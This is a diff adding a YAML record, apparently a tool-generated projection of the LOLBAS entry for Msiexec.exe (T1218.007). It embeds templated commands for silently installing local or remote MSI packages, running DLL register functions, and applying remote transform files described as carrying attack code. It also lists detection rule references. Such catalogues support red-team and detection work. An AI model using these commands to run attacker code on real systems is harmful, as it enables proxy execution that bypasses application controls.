@@ -1,0 +1,118 @@
+id: lolbas/T1NCaW5hcmllcy9Nc2lleGVjLnltbA/RXhlY3V0ZQ/0
+type: binary
+platform: windows
+name: Msiexec.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1218.007
+opsec:
+  noise: high
+  triggers: msiexec.exe retrieving files from Internet
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_masquerading.yml
+  - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
+  - https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/uninstall_app_using_msiexec.yml
+commands:
+- template: msiexec /quiet /i {PATH:.msi}
+  comment: Installs the target .MSI file silently.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Msiexec.exe
+      category: Execute
+      privileges: User
+      mitre_id: T1218.007
+      source_file: OSBinaries/Msiexec.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Msiexec.exe\nDescription: Used by Windows to execute msi files\nAuthor:\
+        \ Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: msiexec /quiet /i {PATH:.msi}\n   \
+        \ Description: Installs the target .MSI file silently.\n    Usecase: Execute custom made msi file\
+        \ with attack code\n    Category: Execute\n    Privileges: User\n    MitreID: T1218.007\n    OperatingSystem:\
+        \ Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      -\
+        \ Execute: MSI\n  - Command: msiexec /q /i {REMOTEURL}\n    Description: Installs the target remote\
+        \ & renamed .MSI file silently.\n    Usecase: Execute custom made msi file with attack code from\
+        \ remote server\n    Category: Execute\n    Privileges: User\n    MitreID: T1218.007\n    OperatingSystem:\
+        \ Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      -\
+        \ Execute: MSI\n      - Execute: Remote\n  - Command: msiexec /y {PATH_ABSOLUTE:.dll}\n    Description:\
+        \ Calls DllRegisterServer to register the target DLL.\n    Usecase: Execute dll files\n    Category:\
+        \ Execute\n    Privileges: User\n    MitreID: T1218.007\n    OperatingSystem: Windows vista, Windows\
+        \ 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute: DLL\n      -\
+        \ Execute: Remote\n  - Command: msiexec /z {PATH_ABSOLUTE:.dll}\n    Description: Calls DllUnregisterServer\
+        \ to un-register the target DLL.\n    Usecase: Execute dll files\n    Category: Execute\n    Privileges:\
+        \ User\n    MitreID: T1218.007\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows\
+        \ 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute: DLL\n      - Execute: Remote\n  - Command:\
+        \ msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=\"{REMOTEURL:.mst}\" /qb\n    Description: Installs\
+        \ the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the\
+        \ file a transformation file will be used, which can contains malicious code or binaries. The\
+        \ /qb will skip user input.\n    Usecase: Install trusted and signed msi file, with additional\
+        \ attack code as transformation file, from a remote server\n    Category: Execute\n    Privileges:\
+        \ User\n    MitreID: T1218.007\n    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows\
+        \ 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute: MSI\n      - Execute: MST\n      -\
+        \ Execute: Remote\nFull_Path:\n  - Path: C:\\Windows\\System32\\msiexec.exe\n  - Path: C:\\Windows\\\
+        SysWOW64\\msiexec.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_masquerading.yml\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml\n\
+        \  - Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/uninstall_app_using_msiexec.yml\n\
+        \  - IOC: msiexec.exe retrieving files from Internet\nResources:\n  - Link: https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/\n\
+        \  - Link: https://twitter.com/PhilipTsukerman/status/992021361106268161\n  - Link: https://badoption.eu/blog/2023/10/03/MSIFortune.html\n\
+        Acknowledgement:\n  - Person: netbiosX\n    Handle: '@netbiosX'\n  - Person: Philip Tsukerman\n\
+        \    Handle: '@PhilipTsukerman'\n"
+      document_sha256: sha256:b95ebe4f1cfb480a7a6fc3ff9de36f10aca8d3fc9bd171491451d5d4062f6fd0
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1218.007
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:c63b7aa94a0068928311dce7ce5ad70d754ff566466e92bfb5b06ae6036f6d49
